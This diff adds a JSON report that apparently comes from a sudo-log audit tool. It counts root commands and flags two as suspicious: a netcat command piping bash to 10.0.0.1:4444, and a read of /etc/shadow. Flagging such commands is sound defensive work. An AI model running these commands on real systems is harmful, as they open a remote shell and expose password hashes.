@@ -1,0 +1,39 @@
+{
+    "total_commands": 4,
+    "root_executions": 4,
+    "suspicious_count": 2,
+    "top_users": [
+        [
+            "developer1",
+            1
+        ],
+        [
+            "qa_tester",
+            1
+        ],
+        [
+            "j_smith",
+            1
+        ],
+        [
+            "sysadmin",
+            1
+        ]
+    ],
+    "suspicious_findings": [
+        {
+            "timestamp": "Sep 27 09:20:10",
+            "user": "qa_tester",
+            "tty": "pts/0",
+            "target_user": "root",
+            "command": "/bin/nc /bin/bash 10.0.0.1 4444"
+        },
+        {
+            "timestamp": "Sep 27 10:05:00",
+            "user": "j_smith",
+            "tty": "pts/1",
+            "target_user": "root",
+            "command": "/bin/cat /etc/shadow"
+        }
+    ]
+}
